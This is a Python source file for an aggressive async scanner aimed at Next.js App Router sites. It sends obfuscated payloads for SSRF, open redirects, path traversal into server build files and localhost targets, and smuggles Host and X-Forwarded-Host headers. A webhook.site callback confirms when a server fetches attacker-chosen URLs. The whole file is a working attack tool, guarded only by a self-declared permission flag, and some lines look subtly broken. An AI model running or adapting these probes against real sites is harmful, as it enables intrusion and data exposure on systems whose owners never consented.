#!/usr/bin/env python3
"""
python3 next15_ultra_max_tester_v7.py \
  --target https://demo.djangocfg.com \
  --prove https://webhook.site/05f5d63c-5397-43ad-9e02-b32d0c8356a0 \
  --out ultra_v7_demo.json \
  --workers 30 \
  --timeout 8 \
  --sleep 0.06 \
  --i-have-permission


next15_ultra_max_tester_v7.py
Super-aggressive (but non-destructive) Next.js App Router URL-parsing tester.

Features:
 - Async concurrency (aiohttp)
 - Many encoded/obfuscated payloads (slashes, pct, unicode, double-encoded, fragments)
 - Probes: _next/image, _next/data, og images, login next, .well-known, api/fetch, server actions, RSC flags, etc.
 - Host-smuggling tries (Host, X-Forwarded-Host, X-Original-URL)
 - Multi-method probes (GET, HEAD, OPTIONS) and timing measurement for side-channel detection
 - Per-payload rate limiting, retries, max-redirect walk (manual)
 - Outputs full JSON and summarized indicators
 - Safety: Only non-destructive requests. --i-have-permission flag required for aggressive host probes.

Usage:
  python3 next15_ultra_max_tester_v7.py --target https://demo.djangocfg.com --prove https://webhook.site/05f5d63c-5397-43ad-9e02-b32d0c8356a0 --out ultra_v7.json --workers 30 --sleep 0.06 --i-have-permission

"""
from __future__ import annotations
import asyncio
import aiohttp
import argparse
import json
import random
import string
import time
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple

# ---------------- CONFIG ----------------
DEFAULT_TIMEOUT = 8
DEFAULT_WORKERS = 20
DEFAULT_SLEEP = 0.08
MAX_REDIRECTS = 6
USER_AGENT = "next15-ultra-max-tester/v7"
# ----------------------------------------

def randtag(n=10) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def pct(s: str) -> str:
    return urllib.parse.quote(s, safe='')

def double_pct(s: str) -> str:
    return pct(pct(s))

def uhex_slash() -> str:
    return "%EF%BC%8F"  # fullwidth slash percent-encoded

# Build payload templates (aggressive set)
def build_payloads(prove_url: Optional[str], tag: str) -> Dict[str, str]:
    p = urllib.parse.urlparse(prove_url) if prove_url else None
    host_only = p.netloc if p else "example.com"
    base_prove = prove_url or "https://example.com/poc"
    payloads: Dict[str, str] = {}

    # Core suspicious paths
    payloads.update({
        "backslash_double_localhost": "/%5C%5Clocalhost:3000",
        "backslash_127": "/%5Chttp://127.0.0.1:3000",
        "double_slash_localhost": "//http://localhost:3000",
        "double_slash_127": "//127.0.0.1:3000",
    })

    # direct prove variants
    payloads["proto_backslash_prove"] = "/%5C" + base_prove
    payloads["proto_backslash_double_prove"] = "/%5C%5C" + base_prove
    payloads["proto_double_slash_prove"] = "//" + base_prove
    payloads["double_encoded_prove"] = "/" + double_pct("\\") + base_prove

    # percent / unicode / null
    payloads["pct_backslash"] = "/%5C"
    payloads["pct_pct_backslash"] = "/%255C"
    payloads["unicode_fullwidth_slash"] = "/" + uhex_slash() + base_prove
    payloads["null_byte_after_path"] = "/%5C%5Clocalhost:3000" + "%00"

    # next-specific
    payloads["image_raw"] = "/_next/image?url=" + urllib.parse.quote("\\\\" + base_prove) + "&w=64&q=75"
    payloads["image_double"] = "/_next/image?url=" + urllib.parse.quote("//" + base_prove) + "&w=64&q=75"
    payloads["rsc_probe"] = "/%5C" + host_only + "?_rsc=1"
    payloads["action_probe"] = "/%5C" + host_only + "?__NEXT_ACTION__=1"
    payloads["next_data_traversal"] = "/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js"
    payloads["next_static_traversal"] = "/_next/static/%2E%2E/%2E%2E/server/app/layout.js"
    payloads["login_next_param"] = "/login?next=%5C%5C" + urllib.parse.quote(base_prove)
    payloads["wellknown_backslash"] = "/.well-known/%5C" + base_prove

    # og/image hops
    payloads["og_image_probe"] = "/%5C" + base_prove + "/opengraph-image.png?tag=" + tag
    payloads["og_hop_probe"] = "/og/%5C%5C" + base_prove + "?tag=" + tag

    # dynamic endpoints & apis
    payloads["api_fetch_probe"] = "/api/fetch/%5C" + base_prove
    payloads["dynamic_user_probe"] = "/user/%5C%5C" + base_prove
    payloads["search_probe"] = "/search?q=%5C%5C" + urllib.parse.quote(base_prove)

    # some fragment/hash tricks
    payloads["hash_backslash_scheme"] = "/#\\http://127.0.0.1"
    payloads["hash_encoded_prove"] = "/#https%3A%2F%2F" + urllib.parse.quote(host_only) + "?tag=" + tag

    # Add a few more fuzzed combos (aggressive)
    extras = [
        "/http%3A//127.0.0.1/go/" + randtag(8),
        "//http%3A//127.0.0.1/fetch?url=" + randtag(8),
        "/%255C%5C" + base_prove,
        "/%5C%5C" + host_only,
        "/%5Chttps:/" + host_only,
        "/http:/%5C%5C" + base_prove,
    ]
    for i, e in enumerate(extras):
        payloads[f"extra_fuzz_{i}"] = e

    # Append a tag param to most
    for k, v in list(payloads.items()):
        if "?" in v:
            payloads[k] = v + "&probe_tag=" + tag
        else:
            payloads[k] = v + ("?probe_tag=" + tag)
    return payloads

# Indicators heuristics
SUSPECT_STRINGS = ["127.0.0.1", "localhost", "169.254.169.254", "metadata", "internal", "docker", "PROVE_URL", "webhook.site", ".next/server", "x-forwarded-for"]

def detect_indicators(text: str, chain: List[dict], prove_url: Optional[str]) -> List[str]:
    combined = text or ""
    for c in chain:
        combined += " " + (c.get("location") or "") + " " + (c.get("snippet") or "")
    inds = []
    for s in SUSPECT_STRINGS:
        if s in combined:
            inds.append(s)
    if prove_url and prove_url in combined:
        inds.append("PROVE_URL")
    # length anomaly
    try:
        if chain and len(chain[-1].get("snippet","")) < 10 and chain[-1].get("status") in (308,302):
            inds.append("length_anomaly_low")
    except Exception:
        pass
    return sorted(set(inds))

# perform single request and follow redirects manually up to MAX_REDIRECTS
async def fetch_and_walk(session: aiohttp.ClientSession, base_target: str, path: str, method: str="GET", headers: Optional[Dict[str,str]]=None, timeout:int=DEFAULT_TIMEOUT) -> Dict[str,Any]:
    url = base_target.rstrip("/") + path
    chain: List[dict] = []
    try:
        async with session.request(method, url, headers=headers or {}, allow_redirects=False, timeout=timeout) as r:
            text = await r.text() if r.content_length is None or r.content_length < 20000 else (await r.text()[:2000])
            chain.append({"url": url, "status": r.status, "location": r.headers.get("Location") or r.headers.get("location"), "snippet": text[:800]})
            hops = 0
            while (r.headers.get("Location") or r.headers.get("location")) and hops < MAX_REDIRECTS:
                loc = r.headers.get("Location") or r.headers.get("location")
                next_url = urllib.parse.urljoin(base_target, loc)
                async with session.request(method, next_url, headers=headers or {}, allow_redirects=False, timeout=timeout) as r:
                    text = await r.text() if r.content_length is None or r.content_length < 20000 else (await r.text()[:2000])
                    chain.append({"url": next_url, "status": r.status, "location": r.headers.get("Location") or r.headers.get("location"), "snippet": text[:800]})
                hops += 1
    except asyncio.TimeoutError:
        return {"error": "timeout", "chain": chain}
    except Exception as e:
        return {"error": str(e), "chain": chain}
    return {"initial": {"path": path, "final_status": chain[-1]["status"] if chain else None}, "chain": chain}

# timing probe helper (side-channel)
async def timing_probe(session: aiohttp.ClientSession, base_target: str, path: str, headers: Optional[Dict[str,str]]=None) -> Dict[str,Any]:
    t0 = time.perf_counter()
    res = await fetch_and_walk(session, base_target, path, headers=headers)
    t1 = time.perf_counter()
    res["_elapsed"] = t1 - t0
    return res

# Host-smuggle runner
async def host_smuggle_variants(session: aiohttp.ClientSession, base_target: str, path: str, variants: List[str], common_headers: Dict[str,str]) -> Dict[str,Any]:
    results = {}
    for hv in variants:
        h = dict(common_headers)
        h["Host"] = hv
        h["X-Forwarded-Host"] = hv
        h["X-Original-URL"] = path
        # short timing + GET
        res = await timing_probe(session, base_target, path, headers=h)
        results[f"host_{hv}"] = {"headers": {"Host": hv}, "res": res}
        await asyncio.sleep(0.02)
    return results

# worker
async def worker(name: int, queue: asyncio.Queue, base_target: str, prove_url: Optional[str], session: aiohttp.ClientSession, results: Dict, args):
    while True:
        try:
            item = queue.get_nowait()
        except asyncio.QueueEmpty:
            return
        key, path = item
        entry: Dict[str,Any] = {"path": path, "checked_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
        headers = {"User-Agent": USER_AGENT}
        # Do GET, HEAD, OPTIONS for coverage (but keep count reasonable)
        summary_tries = []
        for method in ["GET", "HEAD"]:
            try:
                tstart = time.perf_counter()
                res = await timing_probe(session, base_target, path, headers=headers)
                telapsed = res.get("_elapsed", 0.0)
                entry.setdefault("attempts", []).append({"method": method, "res": res, "elapsed": telapsed})
                text_snip = ""
                if isinstance(res.get("chain"), list) and res["chain"]:
                    text_snip = " ".join([c.get("snippet","")[:400] for c in res["chain"]])
                indicators = detect_indicators(text_snip, res.get("chain",[]), prove_url)
                entry["indicators"] = indicators
            except Exception as e:
                entry.setdefault("errors", []).append(str(e))
        # OPTIONS for specific endpoints that might respond differently
        try:
            async with session.options(base_target.rstrip("/") + path, headers=headers, timeout=args.timeout) as r:
                entry["options"] = {"status": r.status, "allow": r.headers.get("Allow") or r.headers.get("allow")}
        except Exception as e:
            entry.setdefault("errors", []).append(f"options_err:{e}")

        # If it's a host-smuggle candidate and permission flag is set, try host smuggling variants
        if args.i_have_permission and ("%5C%5C" in path or "\\\\" in path or "host_smuggle" in key or "127.0.0.1" in path or "localhost" in path):
            hv_list = ["127.0.0.1", "localhost", "0.0.0.0", "::1", prove_url and urllib.parse.urlparse(prove_url).netloc or "example.com"]
            hv_list = [h for h in hv_list if h]
            try:
                sm_res = await host_smuggle_variants(session, base_target, path, hv_list, headers)
                entry["host_smuggle"] = sm_res
                # aggregate indicators
                for k2, v2 in sm_res.items():
                    # quick detect
                    chain = v2.get("res",{}).get("chain",[])
                    body = " ".join([c.get("snippet","") for c in chain])
                    if prove_url and prove_url in body:
                        entry.setdefault("indicators", []).append("PROVE_URL_via_host_smuggle")
            except Exception as e:
                entry.setdefault("errors", []).append(f"host_smuggle_err:{e}")

        results[key] = entry
        await asyncio.sleep(args.sleep)

# main runner
async def run(args):
    tag = randtag(10)
    payloads = build_payloads(args.prove, tag)
    # merge any custom paths user provided (args.extra)
    if args.extra:
        payloads["user_extra"] = args.extra if args.extra.startswith("/") else "/" + args.extra

    queue = asyncio.Queue()
    for k,v in payloads.items():
        # normalize: ensure starts with '/'
        if not v.startswith("/"):
            v = "/" + v
        queue.put_nowait((k, v))

    results: Dict[str,Any] = {"target": args.target, "tag": tag, "prove": args.prove, "start": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "items": {}}

    conn = aiohttp.TCPConnector(limit_per_host=args.workers, ssl=False)  # do not verify ssl? keep default -> False to avoid weird cert failures
    timeout = aiohttp.ClientTimeout(total=args.timeout)

    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        # warmup simple request
        try:
            async with session.get(args.target, headers={"User-Agent": USER_AGENT}, allow_redirects=False) as r:
                results["root_status"] = r.status
        except Exception as e:
            results["root_err"] = str(e)

        workers = []
        for i in range(args.workers):
            workers.append(asyncio.create_task(worker(i, queue, args.target, args.prove, session, results["items"], args)))
        await asyncio.gather(*workers)

    results["end"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    # summarise indicators
    summary = []
    for k, v in results["items"].items():
        if v.get("indicators"):
            summary.append((k, v.get("indicators")))
    results["summary"] = summary
    return results

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--target", "-t", required=True, help="Target base URL (https://...)")
    p.add_argument("--prove", "-p", default=None, help="Proof webhook URL you control (optional)")
    p.add_argument("--out", "-o", default="ultra_v7_results.json", help="Output JSON file")
    p.add_argument("--workers", "-w", type=int, default=DEFAULT_WORKERS, help="Concurrent workers")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Per-request timeout (s)")
    p.add_argument("--sleep", type=float, default=DEFAULT_SLEEP, help="Delay between requests per worker")
    p.add_argument("--i-have-permission", dest="i_have_permission", action="store_true", help="Enable host-smuggle / extra aggressive probes (REQUIRED for advanced smuggle tests)")
    p.add_argument("--extra", help="Extra path to test (single)")
    return p.parse_args()

def main():
    args = parse_args()
    if args.i_have_permission:
        print("[*] Permission flag set: aggressive host-smuggle probes ENABLED.")
    else:
        print("[*] Permission flag NOT set: aggressive host-smuggle probes DISABLED.")
    print(f"[*] Target: {args.target}")
    if args.prove:
        print(f"[*] Prove URL: {args.prove}")
    print(f"[*] workers={args.workers} timeout={args.timeout} sleep={args.sleep}")
    loop = asyncio.get_event_loop()
    try:
        res = loop.run_until_complete(run(args))
    finally:
        # ensure loop cleanup on some platforms
        try:
            loop.close()
        except Exception:
            pass
    # write output
    with open(args.out, "w") as f:
        json.dump(res, f, indent=2)
    print(f"[+] Results written to {args.out}")
    # short summary
    if res.get("summary"):
        print("[!] Indicators found for following payloads:")
        for k, inds in res["summary"]:
            print(f"   - {k}: {inds}")
    else:
        print("[+] No obvious indicators in collected responses.")
    print("[+] Now check your webhook/prove endpoint for incoming requests and your server logs.")
    print("[+] Done.")

if __name__ == "__main__":
    main()
